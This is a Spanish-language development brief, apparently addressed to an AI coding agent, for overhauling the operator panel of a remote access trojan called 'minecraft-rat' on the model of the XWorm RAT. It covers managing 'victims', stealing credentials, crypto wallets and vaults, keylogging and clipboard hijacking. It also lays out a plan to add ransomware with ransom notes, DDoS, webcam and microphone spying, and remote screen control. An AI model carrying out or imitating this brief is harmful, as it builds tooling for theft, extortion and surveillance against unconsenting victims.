# PROMPT — Panel con la ergonomía de XWorm sobre el contrato actual

## 0. Rol y objetivo

Ingeniero senior frontend + full-stack. El panel de `console/` funciona y el contrato
(`contract/v1`) está congelado: lo que falta es **ergonomía de operador**. Toma como
referencia el modelo de interfaz de XWorm (RAT .NET muy extendido) y llévalo a nuestra UI
web: lista de clientes con columnas útiles, menú contextual por víctima con acciones
agrupadas, panel de log/consola siempre visible, pestañas por sesión (monitor, ficheros,
keylogger), acciones en lote y un constructor de build claro.

Dos trabajos a la vez:

1. **Limpiar** la interfaz actual: menos pantallas sueltas, estados vacíos/carga/error
   consistentes, densidad alta, teclado primero, cero ruido.
2. **Añadir** las opciones que faltan, primero las que se resuelven sobre tareas que ya
   existen y después las que necesitan módulo nuevo en el agente.

No reabras las decisiones T1–T6 del endurecimiento. No cambies el contrato WS/HTTP, los
umbrales de rate limit, la deduplicación ni las ventanas de supresión salvo bug demostrado.

## 1. Repo y estado

- Repo: `/home/surrender/x/minecraft-rat`, rama `fix/0.3.7-rat-hardening`.
- Panel: API Fastify en `console/server` (`:4000`), UI Next en `console/src` (`:3000`).
- Ya existe: `victim-table`, `victim-filters`, `task-dialog`, `task-list`, `event-feed`,
  `agent-console`, `file-tree`, `wallet-table`, `world-map`, `counters`, `sidebar`, `topbar`.
- Rutas API actuales de consola: `victims`, `tasks`, `builds`, `artifacts`, `events`,
  `operators`, `audit`, `misc` (`console/server/routes/`).
- Tareas del contrato: `shell`, `file_pull`, `screenshot`, `harvest`, `scan_wallets`,
  `dump_vault`, `crack_vault`, `clip_start`, `clip_stop`, `cancel`, `agent`.
- Comandos del agente vía tarea `agent` (ya implementados): `persist on|off`, `keys
  on|off|status|dump`, `clip …`, `addr …`, `wallet watch …`, `memdump …`, `hives`, `ops`,
  `update …`, `gateway …`, `clear`, `kill`, `sleep`.

## 2. Referencia: cómo es XWorm (y qué copiamos)

XWorm es un panel WinForms de un solo operador. Lo relevante de su interfaz, no del
malware:

- **Ventana única**: arriba una rejilla de clientes (IP, equipo, usuario, SO, país con
  bandera, estado, grupo) y debajo un panel de log/consola que escupe cada evento.
- **Menú contextual sobre la víctima** con grupos, no una lista plana: `Client`
  (reiniciar, cerrar, desinstalar, actualizar, bloquear, nota), `Power` (apagar,
  reiniciar, cerrar sesión), `Options` (pantalla en blanco, TaskMgr, regedit, UAC,
  firewall, Windows Update, BSOD, quitar plugins, borrar restore), `Extra` (report window,
  rendimiento, hosts, keylogger offline/online, chat, buscador de ficheros, message box,
  UAC bypass), `Password recovery` (passwords, cookies, tarjetas, historial, autofill,
  tokens de Discord, Telegram, ProductKey, MetaMask, WiFi…), `Pastime` (CD, iconos,
  swap de botones, barra de tareas, pantalla, volumen, reloj, hablar texto, explorer,
  bandeja), `Monitor`/HVNC (ratón, teclado, autosave, ventana, disco, link, memoria,
  RunPE), `Run file`, `Open URL`, `Location`, `Ransomware`.
- **Pestañas por sesión**: monitor/HVNC, gestor de ficheros con drag & drop, visor de
  keylogger, chat.
- **Acciones en lote** ("Tasks"): recuperación, clave, MetaMask, exclusión de Defender,
  actualizar todos los clientes.
- **Builder aparte**, con casillas: Schtasks, Startup, Registry, MultiDNS, AntiKill,
  WDEX, Keylogger, Clipper, Sleep, Obfuscator, AntiAnalysis, USB spread, Icon, Assembly.
- **Opciones de conexión**: estable, cifrada, cadenas cifradas.

Lo que copiamos: **densidad y agrupación**, no la estética. Nuestra UI es web, en español
neutro, y puede ser mejor: filtros reales, búsqueda, estados y teclado.

## 3. Mapa: XWorm frente a lo que ya tenemos

| XWorm | Nuestro equivalente | Estado |
|---|---|---|
| Rejilla de clientes | `victim-table` | existe; faltan columnas/orden y acciones |
| Log/consola inferior | `event-feed` + `agent-console` | existe; mal integrado |
| Menú contextual | `task-dialog` (modal) | **falta**: todo pasa por modal |
| Monitor/HVNC | `screenshot` (captura puntual) | parcial: sin streaming |
| Gestor de ficheros | `file_pull`, `file-tree` (lectura) | parcial: sin subir/borrar/renombrar |
| Keylogger | tarea `agent` `keys …` | existe sin visor |
| Clipboard | `clip_start`/`clip_stop`, `agent` `addr …` | existe sin panel |
| Password recovery | `harvest`, `scan_wallets`, `dump_vault`, `crack_vault` | existe; falta agruparlo por tipo |
| Power | `agent` `shell` (`shutdown`, `logoff`) | existe sin botón |
| Options (UAC, firewall, BSOD, pantalla) | `shell` + `agent` | existe sin botón ni estado |
| Message box / Open URL | `shell` | existe sin formulario |
| Process/Startup/Programas/TCP/Registro | `shell` | existe sin vista |
| Chat con la víctima | `agent` `clear`, mensajes | **falta** canal de chat |
| Ransomware | — | **falta** |
| DDoS | — | falta |
| Webcam/micrófono | — | falta |
| Builder | `builds` | existe; falta claridad y validación |
| Update de todos | `agent` `update …` + `tasks` en lote | parcial |

## 4. Principios de la nueva interfaz

- **Una sola pantalla de operación**: `/victims` es el centro. La tabla, el detalle y el
  log conviven; el modal solo para formularios que lo necesitan.
- **Menú contextual agrupado** (clic derecho y `Menu` de teclado) con los grupos de la
  tabla anterior, en español y con iconos. Cada acción dice qué tarea lanza y con qué
  parámetros; sin acciones huérfanas.
- **Franja de log persistente** abajo: eventos de la víctima seleccionada, con filtro por
  tipo y pausa. Enlaza a la tarea que lo produjo.
- **Acciones en lote** sobre la selección múltiple (persist, keys, harvest, update,
  cancelar), con confirmación que liste el número y los equipos afectados.
- **Teclado**: `/` busca, flechas navegan, `Enter` abre detalle, `ContextMenu`/`Shift+F10`
  abre el menú, `Ctrl+K` paleta de acciones, `Esc` cierra.
- **Estados**: vacío, cargando (esqueleto), error con reintento, sin conexión (socket
  caído ⇒ acciones deshabilitadas con motivo), tarea en curso (barra y cancelar).
- **Densidad**: filas de 32 px, tipografía monoespaciada para datos, banderas y SO como
  iconos, columnas configurables y persistidas por operador.
- **Sin ruido**: nada de toasts para eventos que ya van al log; solo lo que exige
  decisión.
- **Accesibilidad**: foco visible, `aria-live` en el log, contraste AA, targets ≥ 24 px.

## 5. Plan por fases

### Fase 0 — Limpieza y esqueleto (sin tocar el agente)

1. `/victims`: una sola vista con tabla + detalle lateral + log inferior, columnas
   (`equipo`, `usuario`, `SO`, `versión`, `perfil`, `IP/país`, `última señal`,
   `estado del socket`, `artefactos`, `grupo`) ordenables y persistidas.
2. Sustituir el lanzamiento por modal por `ActionMenu` contextual; el modal queda solo
   para parámetros (`shell`, `file_pull`, `crack_vault`, `message box`).
3. Panel de detalle con pestañas: `Resumen`, `Ficheros`, `Keylogger`, `Clipboard`,
   `Credenciales`, `Wallets`, `Tareas`, `Eventos`. Cada pestaña vacía explica qué falta
   y qué acción la llena.
4. Unificar `event-feed` y `agent-console` en un `SessionLog` con pausa, filtro y
   enlaces a tarea/artefacto.
5. Paleta de acciones (`Ctrl+K`) y atajos; estados y esqueletos en toda la vista.
6. Revisar `/dashboard`, `/tasks`, `/builds`, `/settings` con la misma densidad y
   estados; eliminar duplicidades y pantallas que solo repetían datos.

### Fase 1 — Acciones que ya existen, expuestas bien

Cada una compone tareas/params del contrato, sin cambios de agente:

- `Power`: apagar, reiniciar, cerrar sesión, suspender (`shell` + `shutdown`/`logoff`/`rundll32`).
- `Options`: pantalla en blanco, bloquear entrada, TaskMgr, regedit, UAC, firewall,
  Windows Update, BSOD, quitar restore (`shell`).
- `Message box` y `Open URL` con formulario.
- `Processes`, `Startup`, `Installed programs`, `TCP connections`, `Active window`,
  `Registry` como vistas de solo lectura (`shell` + render de tabla).
- `Búsqueda de ficheros` y `descarga masiva` sobre `file_pull`.
- `Persist`, `Keys`, `Clip`, `Wallet watch`, `Hives`, `Update`, `Kill` desde el menú.
- `Chat`: mensajes del operador con `agent` (texto libre, historial en `events`).
- Acciones en lote con confirmación y resumen de resultados por equipo.

### Fase 2 — Módulos nuevos (agente + contrato + tests)

En este orden, cada uno con su tarea, su esquema en `contract/v1/task-schemas.json` y
pruebas en `ws-check`/validador:

1. `monitor`: streaming de pantalla (frames JPEG/WebP por el canal actual, FPS y calidad
   configurables) con pestaña de visualización y control de ratón/teclado.
2. `files`: subir, crear carpeta, renombrar, borrar, comprimir (`ArtifactPack` al revés).
3. `webcam` y `mic`: una captura y un clip corto.
4. `ransomware`: cifrar/descifrar por ruta con clave derivada del `build_secret`, estado
   y nota de rescate.
5. `ddos`: método, host, puerto, duración y concurrencia.
6. Endurecer lo que ya hay: `harvest` por tipo (navegadores, Discord, Telegram, WiFi,
   ProductKey) con artefactos separados, como los grupos de "Password recovery".

## 6. Contrato y reglas

- No cambies nombres ni semántica de tareas existentes; las nuevas se añaden.
- Toda acción de la UI debe corresponder a una tarea real: nada de botones decorativos.
- Respeta la firma de víctima, los tickets de WS y el límite de 4 tareas concurrentes.
- Errores del panel (`agent_offline`, `busy`, `429`) se muestran con su motivo y qué
  hacer; nunca un "algo falló".
- El log no puede contener tokens, `device_token`, seeds ni contraseñas.
- Sin dependencias nuevas de UI si se resuelve con lo que hay; si hace falta una, justifica.

## 7. Validación

- `npx tsc --noEmit`, `npx tsc -p server/tsconfig.json --noEmit`, `npx next lint
  --max-warnings=0`.
- `npx tsx --test tests/*.test.ts` (49), `npx tsx tests/ws-check.ts` (56),
  `npx tsx contract/v1/ws-validate.ts` (41): no pueden bajar.
- Pruebas nuevas: render de la tabla y del menú contextual, atajos, estados vacío/error,
  confirmación de lote, y una de contrato por cada tarea nueva.
- Repaso manual con dos víctimas (una online y otra offline) y una tarea en curso.

## 8. Entregables

1. Diffs por fase en `/tmp/opencode/<fase>.diff`, sin mezclar fases.
2. Capturas de `/victims` en estados vacío, con selección, menú abierto y tarea en curso.
3. Commits atómicos en el estilo del repo (`feat(panel):`, `refactor(panel):`,
   `feat(agent):`).
4. `docs/UI.md` con la estructura, los atajos y el mapa acción → tarea.
